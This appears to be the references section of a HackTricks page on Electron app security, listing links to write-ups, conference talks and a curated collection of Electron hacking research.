- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
